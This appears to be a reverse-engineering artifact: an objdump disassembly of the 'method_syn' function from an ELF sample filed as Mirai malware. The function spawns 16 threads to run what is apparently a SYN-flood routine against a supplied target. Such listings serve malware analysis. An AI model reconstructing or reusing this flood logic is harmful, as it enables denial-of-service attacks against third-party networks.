
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

00000000004027b0 <method_syn>:
  4027b0: 41 56                        	push	r14
  4027b2: 41 89 ce                     	mov	r14d, ecx
  4027b5: 41 55                        	push	r13
  4027b7: 41 89 d5                     	mov	r13d, edx
  4027ba: ba 50 00 00 00               	mov	edx, 0x50
  4027bf: 41 54                        	push	r12
  4027c1: 41 89 f4                     	mov	r12d, esi
  4027c4: 31 f6                        	xor	esi, esi
  4027c6: 55                           	push	rbp
  4027c7: 53                           	push	rbx
  4027c8: 48 89 fb                     	mov	rbx, rdi
  4027cb: 48 81 ec 50 01 00 00         	sub	rsp, 0x150
  4027d2: 48 8d ac 24 00 01 00 00      	lea	rbp, [rsp + 0x100]
  4027da: 48 89 ef                     	mov	rdi, rbp
  4027dd: e8 3e 73 00 00               	call	0x409b20 <memset>
  4027e2: 48 89 de                     	mov	rsi, rbx
  4027e5: 48 8d 9c 24 80 00 00 00      	lea	rbx, [rsp + 0x80]
  4027ed: ba 3f 00 00 00               	mov	edx, 0x3f
  4027f2: 48 89 ef                     	mov	rdi, rbp
  4027f5: e8 6a 75 00 00               	call	0x409d64 <strncpy>
  4027fa: 44 89 ac 24 44 01 00 00      	mov	dword ptr [rsp + 0x144], r13d
  402802: 31 c0                        	xor	eax, eax
  402804: 4c 8d ab 80 00 00 00         	lea	r13, [rbx + 0x80]
  40280b: 44 89 a4 24 40 01 00 00      	mov	dword ptr [rsp + 0x140], r12d
  402813: 44 89 b4 24 48 01 00 00      	mov	dword ptr [rsp + 0x148], r14d
  40281b: 49 89 e4                     	mov	r12, rsp
  40281e: e8 cd fd ff ff               	call	0x4025f0 <get_local_ip>
  402823: 49 89 e6                     	mov	r14, rsp
  402826: 89 84 24 4c 01 00 00         	mov	dword ptr [rsp + 0x14c], eax
  40282d: 66 66 90                     	nop
  402830: 48 89 2b                     	mov	qword ptr [rbx], rbp
  402833: 48 89 d9                     	mov	rcx, rbx
  402836: 31 f6                        	xor	esi, esi
  402838: 4c 89 e7                     	mov	rdi, r12
  40283b: ba 00 1e 40 00               	mov	edx, 0x401e00
  402840: 48 83 c3 08                  	add	rbx, 0x8
  402844: e8 a7 32 00 00               	call	0x405af0 <pthread_create>
  402849: 49 83 c4 08                  	add	r12, 0x8
  40284d: 4c 39 eb                     	cmp	rbx, r13
  402850: 75 de                        	jne	0x402830 <method_syn+0x80>
  402852: 31 db                        	xor	ebx, ebx
  402854: 49 8b 3c de                  	mov	rdi, qword ptr [r14 + 8*rbx]
  402858: 31 f6                        	xor	esi, esi
  40285a: 48 ff c3                     	inc	rbx
  40285d: e8 59 02 00 00               	call	0x402abb <pthread_join>
  402862: 48 83 fb 10                  	cmp	rbx, 0x10
  402866: 75 ec                        	jne	0x402854 <method_syn+0xa4>
  402868: bf d2 50 41 00               	mov	edi, 0x4150d2
  40286d: e8 da 55 00 00               	call	0x407e4c <puts>
  402872: 48 81 c4 50 01 00 00         	add	rsp, 0x150
  402879: 5b                           	pop	rbx
  40287a: 5d                           	pop	rbp
  40287b: 41 5c                        	pop	r12
  40287d: 41 5d                        	pop	r13
  40287f: 41 5e                        	pop	r14
  402881: c3                           	ret
  402882: 90                           	nop
  402883: 90                           	nop
